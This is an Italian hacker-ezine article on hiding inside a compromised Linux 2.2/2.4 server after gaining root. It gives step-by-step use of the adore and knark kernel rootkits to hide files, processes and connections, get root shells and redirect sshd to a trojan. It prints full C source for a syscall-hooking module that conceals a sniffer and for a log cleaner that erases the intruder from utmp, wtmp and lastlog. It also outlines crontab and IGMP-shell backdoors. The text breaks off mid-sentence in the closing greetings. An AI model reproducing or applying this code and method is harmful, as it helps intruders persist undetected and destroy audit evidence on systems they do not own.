---
title: "n1f6"
ezine: "mojodo"
---

# n1f6

**Ezine:** mojodo

<div className="ascii-content">

```
                                                                                      
         +--------------------------------+                                           
         | Autore: D3Fu                   |                                           
         | Titolo: LKM                    |                                           
         | Mail: d3fu@hushmail.com        |                                           
         | Http://www.d3fu.cjb.net        |                                           
         +--------------------------------+                                           
                                                                                      
+---(w4rn1ng)------------------------------------------------------------------------+
|                                                                                    |
| Questo testo Φ  da considerarsi come  un testo informativo/educativo.  L'autore    |
| non si assume alcuna responsabilitα per l'uso inadeguato delle informazioni qui    |
| contenute. Insomma se vi sgamano non venite a piangere da me :-P                   |
|                                                                                    |
+---(1ntr0)--------------------------------------------------------------------------+
|                                                                                    |
| Dopo  esserci sbizzarriti  con winzozzolo  & unicode,  Φ giunto  il momento  di    |
| ritornare sul caro vecchio Linux, e di avventurarci nel fantastico mondo  della    |
| SOVVERSIONE del sistema, che ci porterα a raffinare le nostre tecniche di  hack    |
| dei sistemi unix,  ed in particolare  sull'hacking dei sistemi  GNU/Linux 2.2.x    |
| 2.4.x .                                                                            |
|                                                                                    |
+---(1ns1d3_th3_S3rv3r)--------------------------------------------------------------+
|                                                                                    |
| Ce l'abbiamo fatta.  Dopo mille peripezie,  siamo riusci a  bucare la macchina,    |
| non sappiamo nemmeno noi come (?) ma abbiamo ottenere i privilegi di  SuperUser    |
| (root). Ora dobbiamo crearci il nostro habitat ideale, un luogo occulto in  cui    |
| nasconderci, lontano da occhi indiscreti, e soprattutto invisibile ... Dobbiamo    |
| fare in modo di  non esistere, di non  essere mai entrati nel  sistema, insomma    |
| dobbiamo  diventare  un  ombra  ...  Esistono  molti  tecniche  per nascondersi    |
| all'interno di un  sistema. In ogni  caso un buon  occultamento in un  sistema,    |
| dipende  essenzialmente  dalla  bravura  dell'attakker  e/o  dalla    stupiditα    |
| dell'amministratore di turno =) Un metodo piuttosto semplice per sovvertire  un    |
| sistema Φ l'installazione di  un rootkit pre-fabbricato. E'  possibile trovarne    |
| molti su packetstorm e siti di security, ognuno specifico per determinati OS  e    |
| versioni dei  binari. Famoso  Φ il  "lrk4" (linux  root kit  versione 4)  [sono    |
| disponibili  anche  le  versioni  5 e  6].  L'impiego  di  un rootkit  permette    |
| all'attakker di modificare  praticamente ogni binario  del sistema, al  fine di    |
| nascondere  files e  processi, nascondere  connessioni da/al  sistema ,  oppure    |
| semplicemente  per  creare  delle backdoor,  mediante  le  quale ritornare  nel    |
| sistema in futuro.  Naturalmente i rootkit  sono previsti anche  di log cleaner    |
| per "spurgare" i  log dal proprio  ip address. Talvolta  si ricorre addirittura    |
| alla patchamento del "syslog" per sovvertire il loggaggio dell'intero  sistema.    |
| No ... non  tratteremo in specifico  l'installazione del "lrk4"  ... per quello    |
| esistono i README ! Ma siamo veramente  sicuri di voler sprecare un bel po'  di    |
| tempo per capire il funzionamento del rootkit, uplodarlo :-(( ed installarlo  ?    |
| ... in  ogni caso  Φ sufficiente  che l'amministratore  sia un  po' sveglio per    |
| notare che i suoi eseguibili si comportano in modo anomalo, e confrontando  gli    |
| output potrebbe scoprirci e buttarci fuori dal sistema ! In ogni caso Φ  facile    |
| che un amministratore abbia copiato e  rinominato comandi quali "ps" e "ls"  in    |
| directory occulte,  da utilizzare  in alternativa  ai tradizionali  ps e ls per    |
| maggiore sicurezza. Sarebbe anche possibile ( ehehehe ) che il Sys abbia creato    |
| appositi script che racchiudo al loro interno le funzionalitα degli  eseguibili    |
| che  noi ci  sforziamo a  patchare ...   Quindi il  rootkit non  Φ proprio  la     |
| soluzione ottimale ...                                                             |
|                                                                                    |
+---(LKM)----------------------------------------------------------------------------+
|                                                                                    |
| Un'  alternativa esiste.  Sono i  LKMs, i  Linux Kernel  Modules. E'  possibile    |
| infatti utilizzare "appositi" moduli,  per nascondere files, creare  backdoors,    |
| nascondere processi e connessioni, etc ... Un buon testo per capire cosa sono i    |
| LKM Φ l'articolo di FuSyS su BFI, nel quale viene trattato il funzionamento  di    |
| questi moduli "carogna", ed il "Complete Linux Loadable Kernel Modules" scritto    |
| da pragmatic dei THC (in inglese). In questo articolo tratteremo l'utilizzo dei    |
| LKM  "adore-0.39b4"  e  "knark-0.54",  entrambi  downlodabili  da   PacketStorm    |
| (http://packetstormsecurity.com).  I  LKM  analizzati  sono  da  utilizzare sui    |
| sistemi GNU/Linux con kernel 2.2.x - 2.4.x. La maggior parte delle informazione    |
| su questi  moduli sono  prese direttamente  dai rispettivi  file README, quindi    |
| consiglio vivamente la loro lettura.                                               |
|                                                                                    |
| Una  volta bucato  il sistema  Φ bene  per prima  cosa(in ordine  cronologico)     |
| cancellare dai files log il proprio ip address. A questo proposito ho  dedicato    |
| giα  parte  del  mio  articolo  sull'hacking  delle  shell  unix,  ma   intendo    |
| approfondire alcuni aspetti nella parte finale di questo articolo. Dopo esserci    |
| resi "invisibili"  agli occhi  del Sys  di turno,  dobbiamo caricare  il nostro    |
| modulo "carogna".  Dopo aver  uplodato il  file *.tar  sul sistema, eseguiamo i    |
| seguenti comandi da shell per installare il LKM :                                  |
|                                                                                    |
| [d3fu@hackedbox /root]# tar xvfz nome_modulo-xx.xx.tar.gz                          |
| [d3fu@hackedbox /root]# cd nome_modulo-xx.xx                                       |
| [d3fu@hackedbox /root/nome_modulo-xx.xx]# make (nella maggior parte dei casi)      |
| ...                                                                                |
| Ora  trattiamo  in  specifico  i  due  moduli,  elencandone  caratteristiche  e    |
| funzionalitα.                                                                      |
|                                                                                    |
+---(4d0r3-0.39b4)-------------------------------------------------------------------+
|                                                                                    |
| Adore 0.39b4 Φ un modulo che pu≥ essere utilizzato per GNU/Linux con kernel 2.x    |
| ( quindi 2.2.x e  2.4.x). L'installazione del modulo  (come il suo utilizzo)  Φ    |
| estremamente semplice. Una  volta scompattati i  files del pacchetto,  entriamo    |
| nella directory "adore" e lanciamo il comando "./configure". Verrα compilato il    |
| modulo, ed i programmi che utilizzeremo per nascondere files/directory/processi    |
| e connessioni. I programmi in questione  sono elencati di seguito con una  loro    |
| breve descrizione :                                                                |
|                                                                                    |
| adore.o 	Il nostro modulo :-P                                                 |
|                                                                                    |
| ava   E' il programma principale. Mediante esso Φ possibile nascondere             |
|       files, directory, processi, etc. Eseguendo ava senza nessun                  |
|       argomento verranno mostrati i vari switchs :                                 |
|            h - nascondere file e directory                                         |
|            u - ripristina la visibilitα del file/directory                         |
|            r - esegue comandi come root (es. /bin/bash)                            |
|            U - disinstalla adore dal sistema                                       |
|            i - rende invisibile il processo di cui si specifica il PID             |
|            v - ripristina la visibilitα del processo                               |
|                                                                                    |
| startadore   Avviando questo script, viene caricato il modulo "adore" e "cleaner"  |
|              (ved. sotto).                                                         |
|                                                                                    |
| cleaner.o    E' un modulo aggiuntivo, usato per ascondere il modulo precedentemente|
|              caricato, dal comando "lsmod". Impiegheremo questo modulo per nasconde|re
|              che il modulo "ioctl" di cui parleremo in seguito.                    |
|                                                                                    |
| Sicuramente un bel LKM, con molte funzionalitα e molto intuitivo.  Interessante    |
| l'opzione "r" che permette di eseguire comandi con privilegi di root. Invece di    |
| "seminare" shell con  SETUID in giro  per il sistema,  noi installiamo il  LKM,    |
| nascondiamo la dir "adore" mediante  il modulo, cancelliamo le nostre  tracce e    |
| facciamo  una copia  delle password  del sistema.  Quando vorremo  "rientrare",    |
| faremo il nostro bel login come un utente comune (non root) ed eseguendo il cmd    |
| "./ava -r /bin/bash" avremo una bella shell con privilegi di root ...              |
|                                                                                    |
+---(kn4rk-0.59)---------------------------------------------------------------------+
|                                                                                    |
| Il secondo modulo  che adremo ad  analizzare Φ knark-0.59.  Knark Φ un  LKM per    |
| kernel 2.2.x . Personalmente ho riscontrato alcuni problemi per la compilazione    |
| di tutti i files del pacchetto, inquanto nel mio caso non Φ avvenuta "al  primo    |
| colpo".  Se  questo problema  si  presentasse anche  a  voi, bisogna  andare  a    |
| compilare i  programmi (non  temete sono  pochi) manualmante  col nostro fedele    |
| gcc. Una volta laciato il  "make", dovremmo avere nella directory  corrente una    |
| serie  di files  che ci  permettono di  svolgere particolari  operazioni (ved.     |
| sotto). Ora Φ necessario caricare il modulo. Per caricarlo digita da shell :       |
|                                                                                    |
| [d3fu@hackedbox /root/nome_modulo-xx.xx]# insmod knark.o                           |
|                                                                                    |
| Se tutto va bene  il modulo viene caricato  sul sistema e noi  siamo pronti per    |
| utilizzarlo. Il pacchetto Knark una volta installato (quindi dopo aver caricato    |
| il  modulo)  creerα  una  directory  nascosta  (/proc/knark)  nella  quale sono    |
| posizionati alcuni files utili :                                                   |
|                                                                                    |
| author	  banner di promozione dell'autore .. che simpatico :-)              |
| files	  lista dei files nascosti sul sistema dal modulo                            |
| nethides	  lista delle stringhe nascoste in /proc/net/[tcp|udp]               |
| pids		  lista dei PIDs nascosti , formato simile a quello di ps            |
| redirects	  lista degli exec-redirection                                       |
|                                                                                    |
| Il modulo Φ corredato inoltre di una serie di programma utilissimi per i nostri    |
| fini malefici :                                                                    |
|                                                                                    |
| hidef	E' usato per nascondere files nel sistema.                                   |
|        Crea tua directory occulta dove vuoi ed esegui da shell :                   |
|        ./hidef /dove/vuoi/tu/.ombra                                                |
|        Ora questa directory sarα nascosta e non sarα mostrata da ls o du.          |
|        Le Subdirectory ed i files saranno nascosti di conseguenza, cos∞            |
|        non Φ necessario ripetere l'operazione per ogni elemento che metti          |
|        in questa directory.                                                        |
|                                                                                    |
|                                                                                    |
|unhidef E' usato per "unhide" i files nascosti. Se non ricordi i files che          |
|        hai nascosto, Φ possibile trovare un elenco in /proc/knark/files.           |
|        Per eseguire il programma digita da shell :                                 |
|        ./unhidef /dove/vuoi/tu/.ombra                                              |
|        In questo modo le directory che avevi reso nascoste saranno                 |
|        nuovamente visibili (esiste un problema nel nascondere files nella          |
|        dir /mnt leggi il Readme :-P ).                                             |
|                                                                                    |
|ered    E' usato per configurare la redirezione degli eseguibili.                   |
|        Copia un tuo sshd trojan in /dove/vuoi/tu/.ombra/sshd_trojan, e digita :    |
|        ./ered /usr/local/sbin/sshd /dove/vuoi/tu/.ombra/sshd_trojan                |
|        Ora, quando /usr/local/sbin/sshd sarα eseguito, il tuo programma            |
|        trojan sarα eseguito istantaneamente. Per eliminare tutte le exec-redirectio|n
|        digita da shell :                                                           |
|        ./ered -c                                                                   |
|                                                                                    |
|                                                                                    |
|nethide E' usato per nascondere stringhe in /proc/net/tcp e /proc/net/udp.          |
|        Questi sono i files da cui netstat prende le sue informazioni. Da  shell    |
|        digita  : ./nethide  ":ABCD "  per nascodere  le connessioni  alla/dalla    |
|        porta ABCD  in esadecimale(43981  dec). Questo  farα un  "grep -v" sulla    |
|        linea  ":ABCD  "  nei files  /proc/net/[tcp|udp].  E'  necessario capire    |
|        l'output dei files /proc/net/[tcp|udp]  per usare questo programma.  Per    |
|        esempio supponiamo  che tu  abbia un  demone sshd  attivo sulla tua box.    |
|        Connettiti al localhost alla porta 22, ed esegui : netstat -at  L'output    |
|        del programma  avrα un  aspetto simile  a questo  : Proto  Recv-Q Send-Q    |
|        Local   Address       Foreign   Address   State   tcp         0        0    |
|        localhost:ssh       localhost:1023    ESTABLISHED  Ora,  controlliamo il    |
|        files  /proc/net/tcp. Digita  : cat  /proc/net/tcp Una  delle linee  del    |
|        files   potrα   essere   tipo   questa   :   local_address   rem_address    |
|        blablabla...   0:0100007F:0016   0100007F:03FF   01    00000000:00000000    |
|        00:00000000 00000000                                                        |
|                                                                                    |
|        Se  vogliamo nascondere  ogni cosa  riguardo all'ip  address 127.0.0.1,     |
|        dobbiamo         tardurlo  in questo  formato .  Inizia con   127: 7F in    |
|        esadecimale (da ora hex). Poi con 0: 00 in hex, che darα 007F. Di  nuovo    |
|        0 :  00007F, e  alla fine  1 che  ci dar≥  il numero  0100007F. Ora,  se    |
|        vogliamo nascondere qualunque cosa  riguardo la porta 22  e l'ip-address    |
|        127.0.0.1 , il formato sarα qualcosa del genere : 0100007F:0016 (0016  Φ    |
|        la  porta  22  in hex).  In  questo  modo digita  da  shell  : ./nethide    |
|        "0100007F:0016" nasconderemo cos∞  tutte le connessioni  al/da localhost    |
|        sulla porta  22. [*consiglio*  : scaricatevi  un convertitore  in hex, Φ    |
|        utile]                                                                      |
|                                                                                    |
|                                                                                    |
|rootme	E'  usato per  dare accesso  root senza  usare programmi  suid. Da shell     |
|        digita : ./rootme  /bin/sh per seguire  /bin/sh con privilegi  root.        |
|        E possibile eseguire anche comandi del tipo :                               |
|		./rootme /bin/ls -l /root                                            |
|                                                                                    |
|taskhack E' usato per cambiare l'*uid e il *gid di processi in esecuzione. Digita   |
|         ./taskhack -alluid=0 pid                                                   |
|         Questo canbiera tutti gli *uid (uid, euid, suid, fsuid) del processo di cui|
|         specifichiamo il "pid" a 0 (quindi a root). Se da shell digitiamo :        |
|         ps aux | grep bash                                                         |
|         creed       91  0.0  1.3  1424   824   1 S    15:31   0:00 -bash           |
|         possimao localizzare il processo della shell (bash) che stiamo usando. Ora |
|         possimao cambiare l'euid di questo processo a 0 (root) digitando :         |
|         ./taskhack -euid=0 91                                                      |
|         ps aux | grep bash                                                         |
|         root (!)    91  0.0  1.3  1424   824   1 S    15:31   0:00 -bash           |
|         Veramente un gran bel tool ...                                             |
|                                                                                    |
|rexec    E' usato per eseguire comandi da remoto su di un "knark-server". Digitando:|
|         ./rexec www.microsoft.com haxored.server.nu /bin/touch /LUDER              |
|         Questo mandarα un pacchetto udp spoofato da www.microsoft.com:53 a         |
|         haxored.server.nu:53, che dirα al server haxored.server.nu di eseguire il  |
|         comando "/bin/touch /LUDER" .                                              |
|                                                                                    |
| Il modulo Knark Φ provvisto inoltre di un LKM aggiuntivo in grado di nascondere    |
| la presenza del modulo "knork" (!). Il modulo in questione lo troverete   nella    |
| dir /knark-0.59  col il  nome di  "modhide.o". Se  non riuscite  a compilare il    |
| modulo  direttamente con il  "make", potete compilarlo e  caricarlo manualmente    |
| mediante i seguenti comandi :                                                      |
|                                                                                    |
| [d3fu@hackedbox]# gcc -c modhide.c ; insmod modhide.o                              |
|                                                                                    |
| E' cosigliato leggere in ogni caso il file README che troverete all'interno del    |
| pacchetto per una migliore comprensione del tutto, anche perchΦ alcuni  aspetti    |
| meno interessanti sono stati tralasciati.                                          |
|                                                                                    |
+---(1d33 su LKM)--------------------------------------------------------------------+
|                                                                                    |
| Come avrete ben  capito i LKM  sono un mezzo  molto utile per  occultarsi in un    |
| sistema.  Passiamo  ora  ad  implementare  alcune  idee  per  un  loro utilizzo    |
| malefico. Sappiamo che Φ possibile nascondere files, quindi creiamoci la nostra    |
| bella directory occulta nel sistema, e li scompattiamo i files del LKM.  Questa    |
| sarα la nostra base da ora in poi.  Ogni nostra azione partirα da qui ... Φ  il    |
| nostro nuovo centro di comando del sistema. Creata la directory, compiliamo  il    |
| modulo  e  carichiamolo sul  sistema.  A questo  punto  rendiamo invisibile  la    |
| directory con  i comandi  opportuni. All'interno  di questa  directory oltre  a    |
| custodire  i files  del modulo,  andremo a  posizionare eventuali  exploit per     |
| attakki futuri, oppure uno sniffer.                                                |
|                                                                                    |
| Uno sniffer per≥  non passo inosservato!  Per nascondere la  modalitα "promisc"    |
| del   sistema  dovremo infatti  impiegare  un altro  modulo,  il cui  codice  Φ    |
| riportato qui                                                                      |
| sotto :                                                                            |
|                                                                                    |
|-start-ioctl.c----------------------------------------------------------------------|
|                                                                                    |
|#define __KERNEL__                                                                  |
|#define MODULE                                                                      |
|#include &lt;linux/module.h>                                                           |
|#include &lt;linux/kernel.h>                                                           |
|#include &lt;linux/ioctl.h>                                                            |
|#include &lt;sys/syscall.h>                                                            |
|#include &lt;linux/if.h>                                                               |
|#include &lt;asm/segment.h>                                                            |
|#include &lt;asm/uaccess.h>                                                            |
|#include &lt;linux/unistd.h>                                                           |
|#include &lt;linux/init.h>                                                             |
|                                                                                    |
|                                                                                    |
|                                                                                    |
|extern void * sys_call_table[];                                                     |
|int promisc;                                                                        |
|int (*o_ioctl) (int, int, unsigned long);                                           |
|                                                                                    |
|int n_ioctl(int d, int request, unsigned long arg)                                  |
|{                                                                                   |
|                                                                                    |
|int tmp;                                                                            |
|struct ifreq ifr;                                                                   |
|                                                                                    |
|tmp = (*o_ioctl) (d, request, arg);                                                 |
|if (request == SIOCGIFFLAGS && !promisc) {                                          |
|  copy_from_user((struct ifreq *) &ifr, (struct ifreq *) arg, sizeof(struct ifreq));|
|  ifr.ifr_flags = ifr.ifr_flags & (~IFF_PROMISC);                                   |
|  copy_to_user((struct ifreq *) arg, (struct ifreq *) &ifr, sizeof(struct if req)); |
|       	}                                                                    |
|else if (request == SIOCSIFFLAGS) {                                                 |
| copy_from_user((struct ifreq *) &ifr, (struct ifreq *) arg, sizeof(struct ifreq)); |
|    if (ifr.ifr_flags & IFF_PROMISC)                                                |
|       promisc = 1;                                                                 |
|    else if (!(ifr.ifr_flags & IFF_PROMISC))                                        |
|       promisc = 0;                                                                 |
|}                                                                                   |
|return tmp;                                                                         |
|}                                                                                   |
|                                                                                    |
|int init_module(void) {                                                             |
|	o_ioctl=sys_call_table[SYS_ioctl];                                           |
|	sys_call_table[SYS_ioctl]=n_ioctl;                                           |
|	return 0;                                                                    |
|}                                                                                   |
|                                                                                    |
|void cleanup_module(void) {                                                         |
|        sys_call_table[SYS_ioctl]=o_ioctl;                                          |
|}                                                                                   |
|-end-code---------------------------------------------------------------------------|
|                                                                                    |
| Naturalmente  dovremo  rendere invisibile  anche  questo mudolo,  semplicemente    |
| digitando da shell : [per quanto riguarda il modulo adore]                         |
|                                                                                    |
| [d3fu@hackedbox /root]# insmod ioctl.o                                             |
| [d3fu@hackedbox /root]# insmod cleaner.o                                           |
| [d3fu@hackedbox /root]# rmmod cleaner.o                                            |
|                                                                                    |
| Bene a questo punto ci manca solo una bella backdoor per tornare nel nostro sistema|
|                                                                                    |
+---(B4ck_d00rS)---------------------------------------------------------------------+
|                                                                                    |
| A noi  serve solo  una cosa.  Una shell  da remoto.  Niente di pi∙. Settare una    |
| shell in ascolto di qualche porta sarebbe qualcosa di troppo "semplice" e  poco    |
| occultato  sia  agli  occhi  dell'Admin,  che  di  altri  individui.  Una buona    |
| soluzione Φ sicuramente  migliorare queste "shell  con le orecchie"  facendo in    |
| modo che quest'ultime  vengano settate *solo*  se noi lo  vogliamo. Vi mostrer≥    |
| due metodi semplici ma efficaci per ottenere questo :                              |
|                                                                                    |
| CronTab :  Ne abbimao  giα parlato  nel mio  primo articolo.  Questa volta per≥    |
| conosciamo anche il rootkit e i LKM :-D ... forse qualcuno avrα giα capito cosa    |
| fare. Per prima cosa patchiamo l'eseguibile relativo al crontab compilando  uno    |
| trojanizzato,  dopodichΦ  facciamo  in  modo  che  setti  una  backdoor  ad una    |
| determinata ora del giorno, magari di notte (ora del server non la nostra!),  e    |
| che venga cancellata dopo un ora. Niente di speciale ma comunque  interessante.    |
| Possiamo inoltre nascondere con il LKM il processo della shell e nascondere  la    |
| connessione.                                                                       |
|                                                                                    |
| IGMPshell : questa Φ un  idea di Vecna, un membro  di BFI. La IGMP shell  Φ una    |
| shell remota i  cui comandi vengono  inviati tramite pacchetti  IGMP (spoofati)    |
| appositamente forgiati dall'attakker.  L'idea di una  shell di questo  tipo era    |
| stata proposta da FuSys (con pacchetti ICMP), ma l'impiego del protocollo  IGMP    |
| rende la  backdoor ancora  pi∙ occultata  (o meglio,  c'Φ minor  rischio che  i    |
| pacchetti vengano filtrati da un  firewall). Per una migliore comprensione  del    |
| codice  vi  rimando  all'articolo  di   vecna  che  potete  trovare  su   BFI#7    |
| (http://www.s0ftpj.org).                                                           |
|                                                                                    |
| Con questo  programma sarα  possibile manovrare  una shell  remota in  modo del    |
| tutto  anonimo.  Questo  significa che  possiamo  eseguire  qualsiasi cosa  sul    |
| sistema su  cui gira  il server  della IGMPshell.  Non ho  tolto i commenti nel    |
| codice perchΦ sono troppo utili per la sua comprensione !                          |
|                                                                                    |
| Vediamo  ora  come  procedere  :  installiamo  il  bock  server  sulla macchina    |
| hackerata, rendiamo  il suo  processo invisibile  con il  LKM, e  nascondiamo i    |
| files della backdoor stessa. Quando  vorremo ritornare nel sistema, ci  basterα    |
| conneterci  (si  fa per  dire)  tramite il  client  della IGMPshell  e  quindi,    |
| settarci un backdoor pi∙ "usuale"  o qualsiasi altra cosa. Insomma  spazio alla    |
| fantasia (come si usa dire :-).                                                    |
|                                                                                    |
+---(l0g_f1l3s(2))-------------------------------------------------------------------+
|                                                                                    |
| In questa sezione vorrei approfondire il discorso relativo alla "pulitura"  dei    |
| files log. Come abbiamo giα detto nel mio primo articolo, Φ necessario uplodare    |
| un log  cleaner per  editare le  strutture binarie  di(alcuni) log  di unix. Il    |
| problema Φ che con i comuni log cleaner quando andiamo a cancellare le stringhe    |
| col nostro ip/hostname, vengono lasciati degli spazi vuoti ... una soluzione  a    |
| questo inconveniente Φ l'impiego  del "DarkCleaner", che anziche'  azzerare gli    |
| ingressi che vogliamo nascondere, semplicemente  non li riporta nel nuovo  file    |
| creato. Questo per quanto riguarda wtmp/utmp. Per lastlog invece di azzerare il    |
| lastlog  e  facendo  cos∞  risultare  un  utente  "never  logged  in"  ,  viene    |
| sovrascritta la  parte del  log che  ci riguarda  con altri  dati, che  vengono    |
| chiesti all'utente durante l'esecuzione del programma. I dati interessati posso    |
| essere recuperati da wtmp utilizzando il comando "last". Naturalmente  andranno    |
| poi aggiustate  le date  dei vari  log che  abbiamo modificato  con il  comando    |
| "touch". Ecco questo buon codice :                                                 |
|                                                                                    |
|-------------------8<---------------------------------------------------------------|
|                                                                                    |
| /*                                                                                 |
| Ciao a tutti! ^_^ Finalmente ecco il  mio log cleaner. Non e' certo codato  *      |
| nel migliore dei modi, ma il suo lavoro lo fa e molto meglio di moltri *  altri    |
| tool in  circolazione, percio'non  vi lamentate  troppo :-)  Se per  * caso  vi    |
| dovesse fare veramente schifo  ci terrei a farvi  sapere che non *  me ne frega    |
| assolutamente nulla e vi  esorto a non usarlo  }:) Se invece *  vi dovesse fare    |
| schifo, ma  avete consigli  o critiche  intelligenti sarei  * felice  se me  le    |
| comunicaste alla mia casella e-mail, Dark0@Angelfire.com * :) Ho optato per  la    |
| creazione di  un'altra coppia  di utmp-wtmp  e non  per *  la semplice modifica    |
| cosi'  potete   aggiustarvi  la   data  della   copia  *  tranquillamente,senza    |
| sovrascrivere tutto  come al  solito. Nota:  di lastlog  * non  verranno create    |
| copie,  ma verra'  modificato il  file che  gli si  da come  * input,  percio'     |
| attenzione. Non mi dilungo ulteriormente in spiegazioni * dato che credo che il    |
| programma estremamente  facile da  utilizzare.... *  Naturalmente se  combinate    |
| macelli non  venite a  rompere a  me, siete  voi i  * responsabili della vostre    |
| azioni :)				                                             |
| * SPECIAL THANKS: a tutti gl≥i amici                                               |
| * -= DARK-ANGEL =-                                                                 |
| */                                                                                 |
| 	                                                                             |
|#include &lt;unistd.h>                                                                 |
|#include &lt;sys/stat.h>                                                               |
|#include &lt;sys/time.h>                                                               |
|#include &lt;stdio.h>                                                                  |
|#include &lt;fcntl.h>                                                                  |
|#include &lt;utmp.h>                                                                   |
|#include &lt;string.h>                                                                 |
|#include &lt;lastlog.h>                                                                |
|#include &lt;pwd.h>                                                                    |
|#include &lt;stdlib.h>                                                                 |
|#include &lt;time.h>                                                                   |
| char buffer[20];                                                                   |
| char bufferNome[29];                                                               |
| char bufferNome2[20];                                                              |
| char *filename="utmp2";                                                            |
| char hostname[50];                                                                 |
| char buffer2[20];                                                                  |
| char lastHost[50];                                                                 |
| char console[5];                                                                   |
| char *filename2="wtmp2";                                                           |
| char *filename3="lastlog2";                                                        |
| int descrittoreBin;                                                                |
| int temp,temp2,temp3,temp4;                                                        |
| struct utmp log;                                                                   |
| struct lastlog ll;                                                                 |
| struct passwd *pass;                                                               |
| struct tm tempo;                                                                   |
| int main(void)                                                                     |
|          {                                                                         |
|    printf("\n DarkCleaner, modo d'uso: copiare nella dir corrente utmp wtmp e last |
|    log.\n Il programma creera' i file utmp2 e wtmp2 e modifichera' lastlog.\n      |
|    Questi 3 files dovranno essere sostituiti agli originali.\n");                  |
|                                                                                    |
|    printf("\n\nOk,let's go! :D\n\n\n"                                              |
|           "Inserire il nome del file utmp:> "); scanf("%s",buffer);                |
|    printf("Inserire l'user da rimuovere:> "); scanf("%s",bufferNome);              |
|    if( ( descrittoreBin = open(buffer,O_RDWR) ) < 0)                               |
|      {                                                                             |
|        printf("\nErrore file %s!\n", buffer);                                      |
|        exit(1);                                                                    |
|      }                                                                             |
|    creat(filename, O_WRONLY);                                                      |
|    if( ( temp = open(filename,O_WRONLY) ) < 0 )                                    |
|      {                                                                             |
|        printf("\nErrore file %s!\n", filename);                                    |
|        exit(1);                                                                    |
|      }                                                                             |
|    while( read(descrittoreBin, &log, sizeof(log)) > 0 )                            |
|       {                                                                            |
|          if( strncmp( log.ut_user, bufferNome, strlen(bufferNome) )!= 0 )          |
|            {                                                                       |
|              write(temp, &log, sizeof(log));                                       |
|            }                                                                       |
|       }                                                                            |
|    close(temp);                                                                    |
|    printf("\n\nCool, utmp riscritto con successo!:D\n"                             |
|           "Ora pensiamo a wtmp....\n\n\n");                                        |
|    printf("Inserire l'host da rimuovere:> "); scanf("%s", hostname);               |
|    printf("Ok, ed da che file?:> "); scanf("%s", buffer2);                         |
|    if( ( temp2 = open(buffer2,O_RDONLY) ) < 0 )                                    |
|      {                                                                             |
|        printf("\nErrore file %s!\n", buffer2);                                     |
|        exit(1);                                                                    |
|      }                                                                             |
|    creat(filename2,O_WRONLY);                                                      |
|    if( ( temp3 = open(filename2,O_WRONLY) ) < 0 )                                  |
|      {                                                                             |
|        printf("\nErrore file %s!\n", filename2);                                   |
|        exit(1);                                                                    |
|      }                                                                             |
|    while( read(temp2, &log, sizeof(log) ) > 0)                                     |
|       {                                                                            |
|        if( (strncmp(log.ut_user, bufferNome, strlen(bufferNome) ) != 0) ||         |
|             (strncmp(log.ut_host, hostname,   strlen(hostname) ) !=0 ) )           |
|           {                                                                        |
|             write(temp3, &log, sizeof(log));                                       |
|           }                                                                        |
|       }                                                                            |
|   close(temp2);                                                                    |
|   close(temp3);                                                                    |
|   printf("\n\nYeah! Ora occupiamoci di lastlog...}:)\n\n"                          |
|          "Inserire il nome del file:> ");                                          |
|   scanf("%s", bufferNome2);                                                        |
|   if( ( temp4 = open(bufferNome2, O_RDWR) ) < 0)                                   |
|    {                                                                               |
|       printf("\nErrore file %s!\n", bufferNome2);                                  |
|        exit(1);                                                                    |
|     }                                                                              |
|   printf("Inserire i parametri dell'ultimo login di %s :\nSecondi:>",bufferNome);  |
|   scanf("%d",&tempo.tm_sec);                                                       |
|   printf("Minuti:>");                                                              |
|   scanf("%d",&tempo.tm_min);                                                       |
|   printf("Ore:>");                                                                 |
|   scanf("%d",&tempo.tm_hour);                                                      |
|   printf("Giorno del mese:>");                                                     |
|   scanf("%d",&tempo.tm_mday);                                                      |
|   printf("Mese:>");                                                                |
|   scanf("%d",&tempo.tm_mon);                                                       |
|   printf("L'anno DAL 1900:>");                                                     |
|   scanf("%d",&tempo.tm_year);                                                      |
|   printf("Giorno della settimana (Domenica e' 0):>");                              |
|   scanf("%d",&tempo.tm_wday);                                                      |
|   printf("Giorno dell'anno?:>");                                                   |
|   scanf("%d",&tempo.tm_yday);                                                      |
|   printf("Ora solare? (1=si,0=no,-1=non so):>");                                   |
|   scanf("%d",&tempo.tm_isdst);                                                     |
|   printf("Con che host?:>");                                                       |
|   scanf("%s",lastHost);                                                            |
|   printf("Su che terminale? (pts/4 ad esempio):>");                                |
|   scanf("%s",console);                                                             |
|   temp3=sizeof(ll);                                                                |
|   pass = getpwnam(bufferNome);                                                     |
|   lseek(temp4, temp3*pass->pw_uid, SEEK_SET);                                      |
|   read(temp4, &ll, sizeof(ll));                                                    |
|   ll.ll_time = mktime(&tempo);                                                     |
|              strncpy (ll.ll_line, console, 5) ;                                    |
|              strcpy (ll.ll_host, lastHost) ;                                       |
|   lseek(temp4, temp3*pass->pw_uid, SEEK_SET);                                      |
|   write(temp4,&ll,temp3);                                                          |
|   close(temp4);                                                                    |
|   printf("\n\nDone! ^__^ May the Darkness be with you! }:)\n\n\n");                |
|   return 0;                                                                        |
| }                                                                                  |
|------------------8<----------------------------------------------------------------|
|                                                                                    |
| Ringrazio prima di  tutto Dark-Angel per  avermi permesso di  pubblicare il suo    |
| DarkCleaner. Per  un uso  ottimale del  programma vi  rimando alla  lettura del    |
| "dartut", scaricabile presso il sito http://twopenguins.b0x.com.                   |
|                                                                                    |
| Come  abbiamo  visto il  tool  in questione  permette  di renderci  ancora  pi∙    |
| occultati all'interno del sistema, ma da  solo non basta. Come ho gia  detto, Φ    |
| doveroso greppare le dirs /var e /etc alla ricerca del proprio ip, oltre che  a    |
| controllare  i  files  /var/log/secure   &  messages  (presenti  nella   stessa    |
| directory), /etc/login.defs e /etc/syslog.conf                                     |
|                                                                                    |
+---(c0nclus10n1)--------------------------------------------------------------------+
|                                                                                    |
| Bene bene, abbiamo creato un  nostro piccolo spazio nel cyberspace,  una nostra    |
| dimensione in cui noi siamo padroni, in cui NOI siamo la matrice  ... ci  siamo    |
| resi invisibili ad occhi indiscreti. Certo, si pu≥ migliorare ogni tecnica,  ma    |
| questa pu≥ bastare per incominicare ... abbiamo creato il nostro HACKBITAT . Un    |
| modulo non vi  pu≥ tuttavia difendere  da ogni pericolo,  Φ solo una  ulteriore    |
| precauzione.  La vera  "sicurezza" si  acquista solo  con l'esperienza  ed una     |
| profonda conoscenza. Per questo ci voglio anni e anni di studio. Buon lavoro  a    |
| tutti.                                                                             |
|                                                                                    |
+---(s4lut1)-------------------------------------------------------------------------+
|                                                                                    |
| Un grande saluto  a tutte le  persone che mi  aiutano, che mi  leggono e che mi    |
